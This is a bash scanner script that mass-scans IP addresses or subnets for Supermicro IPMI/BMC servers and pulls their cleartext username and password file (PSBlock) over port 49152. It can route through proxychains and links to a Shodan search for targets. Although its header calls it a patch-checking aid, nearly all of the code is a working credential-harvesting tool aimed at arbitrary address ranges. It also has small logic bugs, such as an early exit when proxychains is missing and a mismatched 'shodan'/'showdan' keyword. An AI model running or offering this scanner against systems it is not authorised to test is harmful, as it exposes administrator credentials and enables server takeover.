#!/bin/bash
# Supermicro IPMI/BMC Cleartext Password Scanner v20140625 by 1N3
# (c) https://crowdshield.com
# Usage: sh supermicro_scan.sh <CIDR|IP|showdan> [proxy]
#
# ABOUT:
# Supermicro’s implementation of IPMI/BMC allows remote, unauthenticated attackers to 
# request the file PSBlock via port 49152. This plain text password file contains IPMI 
# username and password information. This script allows users to scan their networks
# check for vulnerable systems that require patching. 
#
# USAGE: 
# ./supermicro_scan.sh 74.200.8.237 - Single host scan
# ./supermicro_scan.sh 74.200.0.0/16 proxy - Subnet scan with proxy
# ./supermicro_scan.sh showdan - Search for vulnerable servers on ShowdanHQ
#

#clear
echo "+ -- --=[https://crowdshield.com"
echo "+ -- --=[Supermicro IPMI Cleartext Password Scanner by 1N3"
echo ""

UNICORNSCAN=`which unicornscan`
CURL=`which curl`
PROXYCHAINS=`which proxychains`
TARGET=$1
PROXY=$2

if [ "$UNICORNSCAN" == "" ]; then
	echo "+ -- --=[Unicornscan not installed! Exiting..."
	exit
fi

if [ "$PROXYCHAINS" == "" ]; then
	echo "+ -- --=[Proxychains not installed! Continuing scan without proxy support..."
	exit
fi

if [ "$CURL" == "" ]; then
	echo "+ -- --=[Curl not installed! Exiting..."
	exit
fi

if [ -z "$1" ]; then
	echo "+ -- --=[Usage: $0 <CIDR|IP|showdan> [proxy]"
	exit
fi

if [ $TARGET == "shodan" ]; then
# SCAN USING SHODANHQ SEARCH
	echo "Searching ShowdanHQ..."
	iceweasel http://www.shodanhq.com/search?q=Content-Length%3D3269 &
	exit
fi

if [ "$PROXY" = "proxy" ]; then
#PROXY ENABLED
	echo "+ -- --=[Scanning via proxy..."
	# SCAN FOR THE DEFAULT FILES AND PORTS
	for a in `unicornscan -p 49152 $TARGET 2>/dev/null | awk '{print $5}'`; do 
		echo "+ -- --=[Extracting User/Pass from $a"
		echo "+ -- --=[Sending GET http://$a:49152/PSBlock"
		proxychains curl http://$a:49152/PSBlock -m 3 --retry 1 -f -# | strings
	done
	exit

else 
# NO PROXY
	echo "+ -- --=[Scanning via direct connection..."
	# SCAN FOR THE DEFAULT FILES AND PORTS
	for a in `unicornscan -p 49152 $TARGET 2>/dev/null | awk '{print $5}'`; do 
		echo "+ -- --=[Extracting User/Pass from $a"
		echo "+ -- --=[Sending GET http://$a:49152/PSBlock"
		curl http://$a:49152/PSBlock -m 3 --retry 1 -f -# | strings
	done
	exit

fi

echo ""
echo "+ -- --=[Scan Complete!"
exit 
